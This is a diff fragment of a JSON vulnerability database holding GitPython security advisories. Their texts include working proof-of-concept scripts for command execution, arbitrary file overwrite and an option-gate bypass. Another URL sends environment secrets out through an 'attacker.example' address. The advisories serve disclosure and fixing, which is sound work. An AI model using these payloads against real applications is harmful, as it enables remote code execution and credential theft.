`allow_unsafe_options=True` to allow it.\")\n```\n\nBut `check_unsafe_options` is invoked from **only five sites**, all network commands:\n\n```\ngit/remote.py:1071   Remote.fetch\ngit/remote.py:1125   Remote.pull\ngit/remote.py:1198   Remote.push\ngit/repo/base.py:1410 / :1412  Repo.clone_from\n```\n\nThe following sinks call `git` with caller-controlled options/positionals and are **not** guarded:\n\n### 1. `Repo.archive` \u2014 command execution (`git/repo/base.py:1623`)\n\n```python\ndef archive(self, ostream, treeish=None, prefix=None, **kwargs):\n    ...\n    self.git.archive(\"--\", treeish, *path, **kwargs)\n    return self\n```\n\n`treeish` and `path` are correctly placed after `--`, but `**kwargs` are converted by `Git.transform_kwarg` (`git/cmd.py:1487`) into `--<name>=<value>` flags and inserted **before** the `--` by `_call_process`, with no `check_unsafe_options`. `Repo.archive` already documents user-facing kwargs (`format`, `prefix`, `path`), so forwarding a caller options mapping is an expected usage. Final argv:\n\n```\ngit archive --remote=. --exec=<cmd> -- <treeish>\n```\n\n`git archive --remote=<repo>` runs the upload-archive helper; `--exec=<cmd>` overrides the helper path, executing `<cmd>` on the host. This works with **default Git config** \u2014 it does not rely on the `ext::` transport (which is blocked by default).\n\n### 2. `repo.git.ls_remote(..., upload_pack=...)` \u2014 command execution (dynamic builder, `git/cmd.py:1487`)\n\n`transform_kwarg` dashifies `upload_pack` \u2192 `--upload-pack=<value>`. `git ls-remote <local-repo> --upload-pack=<cmd>` executes `<cmd>`. The dynamic builder makes **both** the flag name and value caller-controlled (`repo.git.<anything>(**user_dict)`), and `ls_remote` has no `check_unsafe_options`.\n\nThis is exactly the underscore-kwarg-vs-hyphen-kwarg gap that CVE-2026-42215 fixed for `fetch`/`pull`/`push`/`clone_from` \u2014 but `ls_remote` and the rest of the dynamic surface were left unpatched.\n\n### 3. `Repo.iter_commits` / `Repo.blame` \u2014 arbitrary file overwrite (`git/objects/commit.py:348`, `git/repo/base.py:1199`)\n\n```python\n# Commit.iter_items (reached via Repo.iter_commits)\nproc = repo.git.rev_list(rev, args_list, as_process=True, **kwargs)   # args_list == [\"--\", *paths]\n```\n\n```python\n# Repo.blame\ndata = self.git.blame(rev, *rev_opts, \"--\", file, p=True, stdout_as_string=False, **kwargs)\n```\n\n`rev` is placed **before** `--`, with no leading-dash check anywhere in the path. A caller passing `rev=\"--output=/path\"` (a value that looks like an ordinary ref/branch/tag string an app forwards from user input) produces:\n\n```\ngit rev-list --output=/path --\n```\n\n`git rev-list`/`log`/`blame` honour `--output=<file>`, which `open()`s and truncates the file *before* validating the revision \u2014 so the file is destroyed even though Git then errors out on the bad revision.\n\n## PoC\n\nAll three PoCs are self-contained, run against the released **GitPython 3.1.50** under **default Git configuration**, and were executed live (git 2.51.0). Each prints a host-side marker proving the effect.\n\n### Install\n\n```bash\npython3 -m venv venv && . venv/bin/activate\npip install GitPython           # resolves to 3.1.50\npython -c \"import git; print(git.__version__)\"   # 3.1.50\n```\n\n### PoC 1 \u2014 command execution via `Repo.archive`\n\n```python\n# archive_rce.py\nimport io, os, tempfile, subprocess, git\n\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a',\n                'commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\n\nmarker = os.path.join(tempfile.gettempdir(), 'gp_rce_marker')\nif os.path.exists(marker): os.remove(marker)\n\n# a service lets a user export a repo and forwards their options dict\nopts = {'remote': '.', 'exec': 'touch ' + marker}\ntry:\n    repo.archive(io.BytesIO(), **opts)\nexcept git.exc.GitCommandError as e:\n    print('[*] git exited non-zero (expected), but the exec already ran:', str(e).splitlines()[0][:60])\n\nprint('[+] marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git exited non-zero (expected), but the exec already ran: Cmd('git') failed due to: exit code(128)\n[+] marker present: True\n```\n\n`git config --get protocol.ext.allow` returns nothing (unset = default), confirming no special config is required.\n\n### PoC 2 \u2014 command execution via `git.ls_remote(upload_pack=...)`\n\n```python\n# lsremote_rce.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nmarker = os.path.join(tempfile.gettempdir(),'gp_lsr_marker')\nif os.path.exists(marker): os.remove(marker)\ntry:\n    repo.git.ls_remote('.', upload_pack='touch '+marker+';')\nexcept git.exc.GitCommandError as e:\n    print('[*] git err:', str(e).splitlines()[0][:50])\nprint('[+] ls-remote marker present:', os.path.exists(marker))\n```\n\nVerbatim output:\n\n```\n[*] git err: Cmd('git') failed due to: exit code(128)\n[+] ls-remote marker present: True\n```\n\n### PoC 3 \u2014 arbitrary file overwrite via a benign-looking `rev`\n\n```python\n# itercommits_filewrite.py\nimport os, tempfile, subprocess, git\nd = tempfile.mkdtemp()\nsubprocess.run(['git','init','-q',d], check=True)\nsubprocess.run(['git','-C',d,'-c','user.email=a@b.c','-c','user.name=a','commit','-q','--allow-empty','-m','init'], check=True)\nrepo = git.Repo(d)\nvictim = os.path.join(tempfile.gettempdir(),'gp_fw_victim')\nopen(victim,'w').write('do not delete\\n')\nprint('[*] before:', repr(open(victim).read()))\nuser_ref = '--output=' + victim          # value an app forwards as a \"ref/branch\"\ntry:\n    list(repo.iter_commits(user_ref))\nexcept git.exc.GitCommandError as e:\n    print('[*] git err (after open+truncate):', str(e).splitlines()[0][:50])\nprint('[+] after :', repr(open(victim).read()), '<- truncated')\n```\n\nVerbatim output:\n\n```\n[*] before: 'do not delete\\n'\n[*] git err (after open+truncate): Cmd('git') failed due to: exit code(129)\n[+] after : '' <- truncated\n```",
-              "id": "GHSA-956x-8gvw-wg5v",
-              "modified": "2026-07-23T03:14:30.313607442Z",
-              "published": "2026-07-21T20:10:06Z",
               "references": [
                 {
                   "type": "WEB",
@@ -1311,25 +1270,35 @@
                   "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.51"
                 }
               ],
-              "related": [
-                "CGA-78vw-9344-jhxg"
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-                  "type": "CVSS_V3"
-                }
-              ],
-              "summary": "GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-77",
+                  "CWE-88"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-21T20:10:06Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
             },
             {
+              "modified": "2026-07-23T03:14:29Z",
+              "published": "2026-07-21T22:06:09Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-rwj8-pgh3-r573",
+              "related": [
+                "CGA-5665-f577-gxxx"
+              ],
+              "summary": "GitPython: Environment-variable exfiltration via os.path.expandvars() on Repo.clone_from() URL",
+              "details": "### Summary\n`Repo.clone_from()` passes the caller-supplied remote URL through `Git.polish_url()`, which on every non-Cygwin platform calls `os.path.expandvars()` on the URL before handing it to `git clone`. An attacker who controls the URL argument \u2014 the documented use case for `clone_from()` in \"import repository from URL\" features of CI servers, git-hosting mirrors, and dependency scanners \u2014 can embed `$NAME` / `${NAME}` tokens that are expanded server-side to the values of the hosting process's environment variables. The resulting URL, now containing the secret, is transmitted over the network to the attacker-named host. This crosses the trust boundary between an untrusted remote URL and the server's process environment, disclosing secrets such as `AWS_SECRET_ACCESS_KEY` or `GITHUB_TOKEN` with no precondition beyond the ability to submit a clone URL.\n\n### Details\n**Affected versions:** `gitpython` (PyPI) \u2014 all releases up to and including `3.1.50` (latest at time of reporting); confirmed present on the `main` branch.\n\n`Git.polish_url()` unconditionally applies environment-variable expansion to its input on the non-Cygwin branch:\n\n`git/cmd.py` (v3.1.50), lines 907\u2013925:\n```python\n@classmethod\ndef polish_url(cls, url: str, is_cygwin: Union[None, bool] = None) -> PathLike:\n    \"\"\"Remove any backslashes from URLs to be written in config files.\n    ...\n    \"\"\"\n    if is_cygwin is None:\n        is_cygwin = cls.is_cygwin()\n\n    if is_cygwin:\n        url = cygpath(url)\n    else:\n        url = os.path.expandvars(url)          # <-- line 921\n        if url.startswith(\"~\"):\n            url = os.path.expanduser(url)\n        url = url.replace(\"\\\\\\\\\", \"\\\\\").replace(\"\\\\\", \"/\")\n    return url\n```\n\n`Repo._clone()` \u2014 reached from the public `Repo.clone_from()` (`git/repo/base.py:1520`) and `Repo.clone()` \u2014 runs the unsafe-protocol check on the **raw** URL and then passes the **polished** (post-expansion) URL to the `git clone` subprocess:\n\n`git/repo/base.py` (v3.1.50), lines 1407\u20131418:\n```python\nif not allow_unsafe_protocols:\n    Git.check_unsafe_protocols(url)\nif not allow_unsafe_options:\n    Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=cls.unsafe_git_clone_options)\nif not allow_unsafe_options and multi:\n    Git.check_unsafe_options(options=multi, unsafe_options=cls.unsafe_git_clone_options)\n\nproc = git.clone(\n    multi,\n    \"--\",\n    Git.polish_url(url),          # <-- line 1417: expanded URL sent to `git clone`\n    clone_path,\n    ...\n)\n```\n\nBecause `os.path.expandvars()` on POSIX substitutes `$NAME` and `${NAME}` with `os.environ[NAME]` when set (and on Windows additionally `%NAME%`), an attacker-supplied URL such as:\n\n```\nhttps://attacker.example/steal/${AWS_SECRET_ACCESS_KEY}/repo.git\n```\n\nis rewritten server-side to embed the literal secret value in the path component, and `git clone` then issues an HTTP(S) request (and DNS lookup, if the token is placed in the host label) carrying that value to `attacker.example`. The clone itself will typically fail, but the secret has already left the server by that point.\n\n`polish_url()` was written as a local-path normalisation helper (Cygwin path conversion, `~` expansion, backslash fixing) and is applied indiscriminately to remote URLs. There is no scheme check, no `expand_vars=False` opt-out for the clone URL, and no documentation that the URL undergoes environment expansion \u2014 the `clone_from` docstring describes `url` only as a \"Valid git url\". By contrast, the maintainers already flag env-var expansion as a security concern for the *local repository path* argument: `Repo.__init__` emits a deprecation warning (\"The use of environment variables in paths is deprecated for security reasons\", `git/repo/base.py:226\u2013231`) and offers `expand_vars=False`. The same treatment is missing for the network-bound clone URL.\n\n**Secondary consequence (unsafe-protocol filter bypass).** Because `check_unsafe_protocols()` runs on the *pre-expansion* URL (line 1408) but the *post-expansion* URL is what reaches `git`, an attacker who additionally controls any environment variable in the server process could set e.g. `X=ext::sh -c '...'` and submit `url=\"$X\"`; the raw string `$X` passes the `ext::` filter, then expands to an `ext::` remote-helper transport that `git` will execute. This requires a second precondition (env-var write) and is noted as an aggravating factor rather than a separate vulnerability.\n\n### PoC\nTested against `gitpython==3.1.50` on Linux with Python 3 and `git` on `PATH`.\n\n```bash\npython3 -m venv /tmp/gp-venv\n/tmp/gp-venv/bin/pip install gitpython==3.1.50\n/tmp/gp-venv/bin/python poc.py\n```\n\n`poc.py`:\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: environment-variable exfiltration via Repo.clone_from() URL.\n\nDemonstrates that an attacker-controlled `url` argument to Repo.clone_from()\nis passed through os.path.expandvars() before being given to `git clone`,\nso `$NAME` tokens in the URL are replaced with the server process's\nenvironment-variable values and transmitted to the attacker-named host.\n\nThe PoC intercepts the Popen argv to show the exact URL handed to `git`\nwithout performing real network I/O.\n\"\"\"\nimport os\nimport sys\nimport subprocess\nimport tempfile\n\n# Simulate a sensitive server-side environment variable.\nos.environ[\"AWS_SECRET_ACCESS_KEY\"] = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n\nimport git                              # noqa: E402\nfrom git import Git, Repo               # noqa: E402\n\nprint(f\"gitpython version: {git.__version__}\")\n\n# --- Layer 1: Git.polish_url() directly --------------------------------------\nattacker_url = \"https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git\"\npolished = Git.polish_url(attacker_url)\nprint(\"\\n[Layer 1] polish_url result:\")\nprint(f\"  input : {attacker_url}\")\nprint(f\"  output: {polished}\")\nif os.environ[\"AWS_SECRET_ACCESS_KEY\"] in polished:\n    print(\"  -> secret SUBSTITUTED into URL by polish_url()\")\n\n# --- Layer 2: full Repo.clone_from() -- capture argv given to `git` ----------\ncaptured = {}\norig_popen = subprocess.Popen\n\nclass CapturingPopen(orig_popen):\n    def __init__(self, cmd, *a, **kw):\n        if isinstance(cmd, (list, tuple)) and \"clone\" in cmd:\n            captured[\"cmd\"] = list(cmd)\n        super().__init__(cmd, *a, **kw)\n\nsubprocess.Popen = CapturingPopen\nimport git.cmd as gitcmd                # noqa: E402\ngitcmd.safer_popen = CapturingPopen     # non-Windows: safer_popen == Popen\n\ndest = tempfile.mkdtemp(prefix=\"gp_poc_\")\ntry:\n    Repo.clone_from(attacker_url, os.path.join(dest, \"out\"))\nexcept Exception as e:\n    # The clone fails (attacker.example does not resolve); we only need argv.\n    print(f\"\\n[Layer 2] clone_from raised (expected): {type(e).__name__}\")\n\nsubprocess.Popen = orig_popen\n\nprint(\"\\n[Layer 2] argv passed to `git clone` subprocess:\")\nfor tok in captured.get(\"cmd\", []):\n    print(f\"  {tok}\")\n\ncmd = captured.get(\"cmd\", [])\nurl_arg = cmd[cmd.index(\"--\") + 1] if \"--\" in cmd else None\nprint(f\"\\n[Layer 2] URL argument given to git: {url_arg}\")\n\nsecret = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\nif url_arg and secret in url_arg:\n    print(\n        \"\\nVULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated \"\n        \"into the remote clone URL; git would transmit it to attacker.example.\"\n    )\n    sys.exit(0)\nprint(\"\\nNOT VULNERABLE\")\nsys.exit(1)\n```\n\nExpected output:\n```\ngitpython version: 3.1.50\n\n[Layer 1] polish_url result:\n  input : https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git\n  output: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n  -> secret SUBSTITUTED into URL by polish_url()\n\n[Layer 2] clone_from raised (expected): GitCommandError\n\n[Layer 2] argv passed to `git clone` subprocess:\n  git\n  clone\n  -v\n  --\n  https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n  /tmp/gp_poc_XXXXXXXX/out\n\n[Layer 2] URL argument given to git: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n\nVULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated into the remote clone URL; git would transmit it to attacker.example.\n```\n\nThe captured argv is the exact command line spawned by GitPython; against a real attacker-controlled host, `git` would issue a DNS lookup and HTTP(S) request to that host with the secret embedded in the request path.\n\n### Impact\nAny application that calls `Repo.clone_from()` (or `Repo.clone()`) with a URL that is wholly or partially attacker-controlled \u2014 the canonical pattern for \"import/mirror repository from URL\" features in CI systems, source-code hosting platforms, dependency scanners, and build pipelines \u2014 allows an unauthenticated or low-privileged attacker to exfiltrate arbitrary environment variables from the server process, one per request, by naming them in the URL. Cloud credentials, API tokens, and signing keys stored in the environment are the primary targets. Applications that do not accept clone URLs from untrusted sources, or that run the cloner in a process with a fully stripped environment, are not affected. There is no direct integrity or availability impact.\n\n**Suggested fix:** Remove the `os.path.expandvars()` (and `os.path.expanduser()`) call from `Git.polish_url()` for inputs that are remote URLs (contain `://` or match `user@host:path`), or remove the expansion entirely and require callers who want local-path env expansion to perform it themselves \u2014 mirroring the existing deprecation on `Repo(path, expand_vars=\u2026)`. Additionally, apply `check_unsafe_protocols()` to the *post-transformation* URL so no future `polish_url` change can silently bypass the `ext::` filter.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                }
+              ],
               "affected": [
                 {
-                  "database_specific": {
-                    "last_known_affected_version_range": "<= 3.1.51",
-                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-rwj8-pgh3-r573/GHSA-rwj8-pgh3-r573.json"
-                  },
                   "package": {
                     "ecosystem": "PyPI",
                     "name": "gitpython",
@@ -1337,6 +1306,7 @@
                   },
                   "ranges": [
                     {
+                      "type": "ECOSYSTEM",
                       "events": [
                         {
                           "introduced": "0"
@@ -1344,8 +1314,7 @@
                         {
                           "fixed": "3.1.52"
                         }
-                      ],
-                      "type": "ECOSYSTEM"
+                      ]
                     }
                   ],
                   "versions": [
@@ -1453,23 +1422,13 @@
                     "3.1.7",
                     "3.1.8",
                     "3.1.9"
-                  ]
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.51",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-rwj8-pgh3-r573/GHSA-rwj8-pgh3-r573.json"
+                  }
                 }
               ],
-              "database_specific": {
-                "cwe_ids": [
-                  "CWE-200",
-                  "CWE-201"
-                ],
-                "github_reviewed": true,
-                "github_reviewed_at": "2026-07-21T22:06:09Z",
-                "nvd_published_at": null,
-                "severity": "HIGH"
-              },
-              "details": "### Summary\n`Repo.clone_from()` passes the caller-supplied remote URL through `Git.polish_url()`, which on every non-Cygwin platform calls `os.path.expandvars()` on the URL before handing it to `git clone`. An attacker who controls the URL argument \u2014 the documented use case for `clone_from()` in \"import repository from URL\" features of CI servers, git-hosting mirrors, and dependency scanners \u2014 can embed `$NAME` / `${NAME}` tokens that are expanded server-side to the values of the hosting process's environment variables. The resulting URL, now containing the secret, is transmitted over the network to the attacker-named host. This crosses the trust boundary between an untrusted remote URL and the server's process environment, disclosing secrets such as `AWS_SECRET_ACCESS_KEY` or `GITHUB_TOKEN` with no precondition beyond the ability to submit a clone URL.\n\n### Details\n**Affected versions:** `gitpython` (PyPI) \u2014 all releases up to and including `3.1.50` (latest at time of reporting); confirmed present on the `main` branch.\n\n`Git.polish_url()` unconditionally applies environment-variable expansion to its input on the non-Cygwin branch:\n\n`git/cmd.py` (v3.1.50), lines 907\u2013925:\n```python\n@classmethod\ndef polish_url(cls, url: str, is_cygwin: Union[None, bool] = None) -> PathLike:\n    \"\"\"Remove any backslashes from URLs to be written in config files.\n    ...\n    \"\"\"\n    if is_cygwin is None:\n        is_cygwin = cls.is_cygwin()\n\n    if is_cygwin:\n        url = cygpath(url)\n    else:\n        url = os.path.expandvars(url)          # <-- line 921\n        if url.startswith(\"~\"):\n            url = os.path.expanduser(url)\n        url = url.replace(\"\\\\\\\\\", \"\\\\\").replace(\"\\\\\", \"/\")\n    return url\n```\n\n`Repo._clone()` \u2014 reached from the public `Repo.clone_from()` (`git/repo/base.py:1520`) and `Repo.clone()` \u2014 runs the unsafe-protocol check on the **raw** URL and then passes the **polished** (post-expansion) URL to the `git clone` subprocess:\n\n`git/repo/base.py` (v3.1.50), lines 1407\u20131418:\n```python\nif not allow_unsafe_protocols:\n    Git.check_unsafe_protocols(url)\nif not allow_unsafe_options:\n    Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=cls.unsafe_git_clone_options)\nif not allow_unsafe_options and multi:\n    Git.check_unsafe_options(options=multi, unsafe_options=cls.unsafe_git_clone_options)\n\nproc = git.clone(\n    multi,\n    \"--\",\n    Git.polish_url(url),          # <-- line 1417: expanded URL sent to `git clone`\n    clone_path,\n    ...\n)\n```\n\nBecause `os.path.expandvars()` on POSIX substitutes `$NAME` and `${NAME}` with `os.environ[NAME]` when set (and on Windows additionally `%NAME%`), an attacker-supplied URL such as:\n\n```\nhttps://attacker.example/steal/${AWS_SECRET_ACCESS_KEY}/repo.git\n```\n\nis rewritten server-side to embed the literal secret value in the path component, and `git clone` then issues an HTTP(S) request (and DNS lookup, if the token is placed in the host label) carrying that value to `attacker.example`. The clone itself will typically fail, but the secret has already left the server by that point.\n\n`polish_url()` was written as a local-path normalisation helper (Cygwin path conversion, `~` expansion, backslash fixing) and is applied indiscriminately to remote URLs. There is no scheme check, no `expand_vars=False` opt-out for the clone URL, and no documentation that the URL undergoes environment expansion \u2014 the `clone_from` docstring describes `url` only as a \"Valid git url\". By contrast, the maintainers already flag env-var expansion as a security concern for the *local repository path* argument: `Repo.__init__` emits a deprecation warning (\"The use of environment variables in paths is deprecated for security reasons\", `git/repo/base.py:226\u2013231`) and offers `expand_vars=False`. The same treatment is missing for the network-bound clone URL.\n\n**Secondary consequence (unsafe-protocol filter bypass).** Because `check_unsafe_protocols()` runs on the *pre-expansion* URL (line 1408) but the *post-expansion* URL is what reaches `git`, an attacker who additionally controls any environment variable in the server process could set e.g. `X=ext::sh -c '...'` and submit `url=\"$X\"`; the raw string `$X` passes the `ext::` filter, then expands to an `ext::` remote-helper transport that `git` will execute. This requires a second precondition (env-var write) and is noted as an aggravating factor rather than a separate vulnerability.\n\n### PoC\nTested against `gitpython==3.1.50` on Linux with Python 3 and `git` on `PATH`.\n\n```bash\npython3 -m venv /tmp/gp-venv\n/tmp/gp-venv/bin/pip install gitpython==3.1.50\n/tmp/gp-venv/bin/python poc.py\n```\n\n`poc.py`:\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: environment-variable exfiltration via Repo.clone_from() URL.\n\nDemonstrates that an attacker-controlled `url` argument to Repo.clone_from()\nis passed through os.path.expandvars() before being given to `git clone`,\nso `$NAME` tokens in the URL are replaced with the server process's\nenvironment-variable values and transmitted to the attacker-named host.\n\nThe PoC intercepts the Popen argv to show the exact URL handed to `git`\nwithout performing real network I/O.\n\"\"\"\nimport os\nimport sys\nimport subprocess\nimport tempfile\n\n# Simulate a sensitive server-side environment variable.\nos.environ[\"AWS_SECRET_ACCESS_KEY\"] = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n\nimport git                              # noqa: E402\nfrom git import Git, Repo               # noqa: E402\n\nprint(f\"gitpython version: {git.__version__}\")\n\n# --- Layer 1: Git.polish_url() directly --------------------------------------\nattacker_url = \"https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git\"\npolished = Git.polish_url(attacker_url)\nprint(\"\\n[Layer 1] polish_url result:\")\nprint(f\"  input : {attacker_url}\")\nprint(f\"  output: {polished}\")\nif os.environ[\"AWS_SECRET_ACCESS_KEY\"] in polished:\n    print(\"  -> secret SUBSTITUTED into URL by polish_url()\")\n\n# --- Layer 2: full Repo.clone_from() -- capture argv given to `git` ----------\ncaptured = {}\norig_popen = subprocess.Popen\n\nclass CapturingPopen(orig_popen):\n    def __init__(self, cmd, *a, **kw):\n        if isinstance(cmd, (list, tuple)) and \"clone\" in cmd:\n            captured[\"cmd\"] = list(cmd)\n        super().__init__(cmd, *a, **kw)\n\nsubprocess.Popen = CapturingPopen\nimport git.cmd as gitcmd                # noqa: E402\ngitcmd.safer_popen = CapturingPopen     # non-Windows: safer_popen == Popen\n\ndest = tempfile.mkdtemp(prefix=\"gp_poc_\")\ntry:\n    Repo.clone_from(attacker_url, os.path.join(dest, \"out\"))\nexcept Exception as e:\n    # The clone fails (attacker.example does not resolve); we only need argv.\n    print(f\"\\n[Layer 2] clone_from raised (expected): {type(e).__name__}\")\n\nsubprocess.Popen = orig_popen\n\nprint(\"\\n[Layer 2] argv passed to `git clone` subprocess:\")\nfor tok in captured.get(\"cmd\", []):\n    print(f\"  {tok}\")\n\ncmd = captured.get(\"cmd\", [])\nurl_arg = cmd[cmd.index(\"--\") + 1] if \"--\" in cmd else None\nprint(f\"\\n[Layer 2] URL argument given to git: {url_arg}\")\n\nsecret = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\nif url_arg and secret in url_arg:\n    print(\n        \"\\nVULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated \"\n        \"into the remote clone URL; git would transmit it to attacker.example.\"\n    )\n    sys.exit(0)\nprint(\"\\nNOT VULNERABLE\")\nsys.exit(1)\n```\n\nExpected output:\n```\ngitpython version: 3.1.50\n\n[Layer 1] polish_url result:\n  input : https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git\n  output: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n  -> secret SUBSTITUTED into URL by polish_url()\n\n[Layer 2] clone_from raised (expected): GitCommandError\n\n[Layer 2] argv passed to `git clone` subprocess:\n  git\n  clone\n  -v\n  --\n  https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n  /tmp/gp_poc_XXXXXXXX/out\n\n[Layer 2] URL argument given to git: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git\n\nVULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated into the remote clone URL; git would transmit it to attacker.example.\n```\n\nThe captured argv is the exact command line spawned by GitPython; against a real attacker-controlled host, `git` would issue a DNS lookup and HTTP(S) request to that host with the secret embedded in the request path.\n\n### Impact\nAny application that calls `Repo.clone_from()` (or `Repo.clone()`) with a URL that is wholly or partially attacker-controlled \u2014 the canonical pattern for \"import/mirror repository from URL\" features in CI systems, source-code hosting platforms, dependency scanners, and build pipelines \u2014 allows an unauthenticated or low-privileged attacker to exfiltrate arbitrary environment variables from the server process, one per request, by naming them in the URL. Cloud credentials, API tokens, and signing keys stored in the environment are the primary targets. Applications that do not accept clone URLs from untrusted sources, or that run the cloner in a process with a fully stripped environment, are not affected. There is no direct integrity or availability impact.\n\n**Suggested fix:** Remove the `os.path.expandvars()` (and `os.path.expanduser()`) call from `Git.polish_url()` for inputs that are remote URLs (contain `://` or match `user@host:path`), or remove the expansion entirely and require callers who want local-path env expansion to perform it themselves \u2014 mirroring the existing deprecation on `Repo(path, expand_vars=\u2026)`. Additionally, apply `check_unsafe_protocols()` to the *post-transformation* URL so no future `polish_url` change can silently bypass the `ext::` filter.",
-              "id": "GHSA-rwj8-pgh3-r573",
-              "modified": "2026-07-23T03:14:29.805707445Z",
-              "published": "2026-07-21T22:06:09Z",
               "references": [
                 {
                   "type": "WEB",
@@ -1492,24 +1451,35 @@
                   "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.52"
                 }
               ],
-              "related": [
-                "CGA-5665-f577-gxxx"
-              ],
-              "schema_version": "1.7.5",
-              "severity": [
-                {
-                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
-                  "type": "CVSS_V3"
-                }
-              ],
-              "summary": "GitPython: Environment-variable exfiltration via os.path.expandvars() on Repo.clone_from() URL"
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-200",
+                  "CWE-201"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-21T22:06:09Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
             },
             {
+              "modified": "2026-07-23T03:14:30Z",
+              "published": "2026-07-21T19:43:14Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-v396-v7q4-x2qj",
+              "related": [
+                "CGA-5w9h-q384-cggx"
+              ],
+              "summary": "GitPython unsafe clone option gate bypass through joined short options",
+              "details": "`GitPython` version `3.1.50` blocks unsafe `git clone` options such as `--upload-pack`, `-u`, `--config`, and `-c` unless callers explicitly pass `allow_unsafe_options=True`. However, the default unsafe-option gate does not recognize joined short-option forms such as `-u/path/to/helper`.\n\nGit itself accepts `-u<upload-pack>` as the short form of `--upload-pack=<upload-pack>`. As a result, `Repo.clone_from(..., multi_options=[\"-u<helper>\"], allow_unsafe_options=False)` can execute the helper command even though the equivalent long option is blocked.\n\nAffected package:\n\n- Ecosystem: PyPI\n- Package: `GitPython`\n- Confirmed affected version: `3.1.50`\n- Repository: `gitpython-developers/GitPython`\n- Current PyPI version during triage: `3.1.50`\n\nRelevant behavior:\n\n- `Repo.unsafe_git_clone_options` correctly lists `--upload-pack`, `-u`, `--config`, and `-c` as unsafe clone options.\n- `Repo._clone()` splits `multi_options` with `shlex.split(\" \".join(multi_options))` and then calls `Git.check_unsafe_options(...)`.\n- `_canonicalize_option_name(\"-u/path/to/helper\")` returns a string beginning with `u...`, not the canonical short option `u`, so it does not match the blocked `-u` entry.\n- Git accepts the same joined short option as `--upload-pack=<helper>` and executes the helper during clone.\n\nPreconditions:\n\nAn application must pass attacker-influenced clone options into `Repo.clone_from(..., multi_options=...)` while relying on GitPython's default unsafe-option gate to block command-executing options.\n\nThe local PoC uses only a local bare Git repository and a local helper script. It does not contact any third-party service.\n\nLocal reproduction:\n\nThe PoC creates a disposable bare Git repository, a helper script, and a sentinel file path. It first confirms that the long `--upload-pack=<helper>` form is blocked by GitPython. It then calls `Repo.clone_from(..., multi_options=[\"-u<helper>\"], allow_unsafe_options=False)`.\n\nObserved sanitized output:\n\n```text\ngitpython_version=3.1.50\ngit_version=git version 2.53.0.windows.1\ntmp_dir=<tmp>\nlong_upload_pack_gate=BLOCKED:UnsafeOptionError\njoined_short_upload_pack_gate=ALLOWED\nclone_result=EXPECTED_EXCEPTION:GitCommandError\nsentinel_exists=True\nsentinel_text=GITPYTHON_UNSAFE_OPTION_BYPASS\n```\n\nThe clone fails because the helper exits nonzero, but the sentinel file proves that Git executed the helper despite `allow_unsafe_options=False`.\n\nImpact:\n\nAn attacker who controls `multi_options` can bypass GitPython's default `allow_unsafe_options=False` protection and execute a local command via Git's `--upload-pack` / `-u` clone option. This is a residual bypass of an explicit GitPython security boundary, not merely a case where a caller opted into unsafe behavior.\n\nDuplicate / related advisory checks:\n\n- OSV query for `PyPI/GitPython` version `3.1.50` returned no vulnerabilities.\n- The repository's public advisories include related unsafe Git option issues, including `GHSA-x2qx-6953-8485` / 